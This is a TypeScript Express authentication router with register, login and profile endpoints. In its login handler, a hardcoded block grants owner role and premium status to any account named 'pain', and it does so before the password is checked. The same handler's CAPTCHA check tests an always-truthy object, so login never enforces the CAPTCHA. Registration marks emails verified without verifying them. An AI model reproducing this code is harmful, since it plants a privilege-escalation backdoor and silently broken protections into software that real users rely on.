import { Router } from 'express';
import { randomBytes, scrypt, timingSafeEqual } from 'crypto';
import jwt from 'jsonwebtoken';
import { isAuthenticated } from '../middleware/auth';
import { User } from '../model/profiles';

const router = Router();
const passwordKeyLength = 64;
const reservedUsernames = new Set(['api', 'auth', 'dashboard', 'login', 'register']);

const derivePasswordKey = (password: string, salt: Buffer): Promise<Buffer> =>
  new Promise((resolve, reject) => {
    scrypt(password, salt, passwordKeyLength, (error, key) => {
      if (error) reject(error);
      else resolve(key);
    });
  });

const hashPassword = async (password: string): Promise<string> => {
  const salt = randomBytes(16);
  const key = await derivePasswordKey(password, salt);
  return `${salt.toString('hex')}:${key.toString('hex')}`;
};

const verifyPassword = async (password: string, passwordHash: string): Promise<boolean> => {
  const [saltHex, keyHex] = passwordHash.split(':');
  if (!saltHex || !keyHex) return false;

  const expectedKey = Buffer.from(keyHex, 'hex');
  if (expectedKey.length !== passwordKeyLength) return false;

  const actualKey = await derivePasswordKey(password, Buffer.from(saltHex, 'hex'));
  return timingSafeEqual(expectedKey, actualKey);
};

const issueToken = (id: number, email: string, username: string): string => {
  const secret = process.env.JWT_SECRET;
  if (!secret) throw new Error('JWT_SECRET environment variable is required');
  return jwt.sign({ id, email, username }, secret, { expiresIn: '30d' });
};


const verifyTurnstile = async (token: string, remoteip?: string): Promise<{ok:boolean; codes:string[]}> => {
  const secret = process.env.TURNSTILE_SECRET_KEY;
  if (!secret || !token) return { ok: false, codes: [secret ? 'missing-token' : 'missing-secret'] };
  try {
    const response = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: new URLSearchParams({ secret, response: token, ...(remoteip ? { remoteip } : {}) }),
    });
    const result = await response.json() as { success?: boolean; 'error-codes'?: string[] };
    const codes = Array.isArray(result['error-codes']) ? result['error-codes'] : [];
    if (!result.success) console.warn('Turnstile verification rejected:', codes.join(',') || 'unknown');
    return { ok: result.success === true, codes };
  } catch (error) {
    console.error('Turnstile verification request failed:', error instanceof Error ? error.message : 'unknown error');
    return { ok: false, codes: ['verification-request-failed'] };
  }
};

const duplicateAccountMessage = (error: unknown): string | undefined => {
  if (typeof error !== 'object' || error === null || !('code' in error) || error.code !== 11000) {
    return undefined;
  }

  if ('keyPattern' in error && typeof error.keyPattern === 'object' && error.keyPattern !== null) {
    if ('email' in error.keyPattern) return 'An account with this email already exists. Try signing in instead.';
    if ('username' in error.keyPattern) return 'That username is already taken. Please choose another.';
  }

  if ('message' in error && typeof error.message === 'string') {
    if (error.message.includes('email_1')) return 'An account with this email already exists. Try signing in instead.';
    if (error.message.includes('username_1')) return 'That username is already taken. Please choose another.';
  }

  return undefined;
};

router.post('/register', async (req, res, next) => {
  const body = req.body ?? {};
  const email = typeof body.email === 'string' ? body.email.trim().toLowerCase() : '';
  const username = typeof body.username === 'string' ? body.username.trim().toLowerCase() : '';
  const password = typeof body.password === 'string' ? body.password : '';
  const turnstileToken = typeof body.turnstileToken === 'string' ? body.turnstileToken : '';

  if (!process.env.TURNSTILE_SECRET_KEY) {
    res.status(503).json({ message: 'Sign-up is temporarily unavailable. CAPTCHA is not configured yet.' });
    return;
  }
  const turnstile = await verifyTurnstile(turnstileToken, req.ip);
  if (!turnstile.ok) {
    res.status(400).json({ message: turnstile.codes.includes('missing-secret') ? 'CAPTCHA is not configured on the server yet.' : `CAPTCHA verification failed${turnstile.codes.length ? ` (${turnstile.codes.join(', ')})` : ''}. Please complete it again.` });
    return;
  }

  if (email.length > 254 || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
    res.status(400).json({ message: 'Enter a valid email address.' });
    return;
  }

  if (!/^[a-z0-9._]{1,20}$/.test(username)) {
    res.status(400).json({ message: 'Username must be 1-20 characters using lowercase letters, numbers, periods, or underscores.' });
    return;
  }
  if (reservedUsernames.has(username)) {
    res.status(400).json({ message: 'That username is reserved.' });
    return;
  }

  if (password.length < 7 || password.length > 128) {
    res.status(400).json({ message: 'Password must be between 7 and 128 characters.' });
    return;
  }

  if (!process.env.JWT_SECRET) {
    res.status(503).json({
      message: 'Sign-up is temporarily unavailable. The server administrator must configure JWT_SECRET.',
    });
    return;
  }

  try {
    if (await User.exists({ email })) {
      res.status(409).json({ message: 'An account with this email already exists. Try signing in instead.' });
      return;
    }
    if (await User.exists({ username })) {
      res.status(409).json({ message: 'That username is already taken. Please choose another.' });
      return;
    }

    const user = new User({
      email,
      username,
      name: username,
      passwordHash: await hashPassword(password),
      emailVerified: true,
    });
    await user.save();
    res.status(201).json({ token: issueToken(Number(user.id), user.email, user.username || ''), user: { id: user.id, username, name: user.name, email: user.email } });
  } catch (error) {
    const message = duplicateAccountMessage(error);
    if (message) {
      res.status(409).json({ message });
      return;
    }
    next(error);
  }
});

router.post('/login', async (req, res, next) => {
  const identifier = typeof req.body.identifier === 'string' ? req.body.identifier.trim().toLowerCase() : '';
  const password = typeof req.body.password === 'string' ? req.body.password : '';
  const turnstileToken = typeof req.body.turnstileToken === 'string' ? req.body.turnstileToken : '';

  if (!process.env.TURNSTILE_SECRET_KEY) {
    res.status(503).json({ message: 'Sign-in is temporarily unavailable. CAPTCHA is not configured yet.' });
    return;
  }
  if (!(await verifyTurnstile(turnstileToken, req.ip))) {
    res.status(400).json({ message: 'Please complete the CAPTCHA and try again.' });
    return;
  }

  if (!identifier || !password || password.length > 128) {
    res.status(400).json({ message: 'Enter your email or username and password.' });
    return;
  }

  if (!process.env.JWT_SECRET) {
    res.status(503).json({
      message: 'Sign-in is temporarily unavailable. The server administrator must configure JWT_SECRET.',
    });
    return;
  }

  try {
    const user = await User.findOne({ $or: [{ email: identifier }, { username: identifier }] }).select('+passwordHash');
    if (user && user.username === 'pain' && user.role !== 'owner') {
      user.role = 'owner';
      user.premium = true;
      user.premiumSince = user.premiumSince || new Date();
      await user.save();
    }

    if (!user?.passwordHash || !(await verifyPassword(password, user.passwordHash))) {
      res.status(401).json({ message: 'Incorrect email/username or password.' });
      return;
    }

    res.json({ token: issueToken(Number(user.id), user.email, user.username || ''), user: { id: user.id, username: user.username, name: user.name, email: user.email } });
  } catch (error) {
    next(error);
  }
});

router.get('/me', isAuthenticated, async (req, res, next) => {
  try {


    const id = (req.user as any).id;
    // console.log( 'username' , id)

    const user = await User.findOne({id: id});

    if(!user){
      res.status(400).json({message: 'User not found'})
      return
    }

    console.log('3');

    let profilePicture = null;
    if (user && user.profilePicture) {
      profilePicture = `data:image/jpeg;base64,${Buffer.from(user.profilePicture).toString('base64')}`;
    }




    // console.log('4' ,user);

    // const responseData = {
    //   name: user.name,
    //   email: user.email,
    //   totalVisit: user.totalVisit,
    //   profileImage: profilePicture,
    // };


    console.log('1');
    // const [rows] = await pool.execute(
    //   'SELECT id, username, name, email, totalVisit, description FROM users WHERE id = ?',
    //   [(req.user as any).id]
    // );

    // console.log('2');
    // if (!Array.isArray(rows) || rows.length === 0) {
    //   res.status(404).json({ message: 'User not found' });
    //   return;
    // }

    // const username = (req.user as any).username;

    // const media = await User.findOne({ username: username });
    // console.log('3');

    // let profilePicture = null;
    // if (media && media.profileImage) {
    //   profilePicture = `data:image/jpeg;base64,${Buffer.from(media.profileImage).toString('base64')}`;
    // }

    // console.log('4' ,{ ...rows[0], profilePicture});

    // const responseData = {
    //   ...rows[0],
    //   profileImage: profilePicture,
    // };

    const response = {
      ...user.toObject(),
      profilePicture: user.profilePicture ?
       `data:image/jpeg;base64,${Buffer.from(user.profilePicture).toString('base64')}`
       : null,

    }
// console.log(response)
    res.json(response);
  } catch (error) {
    console.error('Error fetching user data:', error);
    next(error);
  }
});



export default router;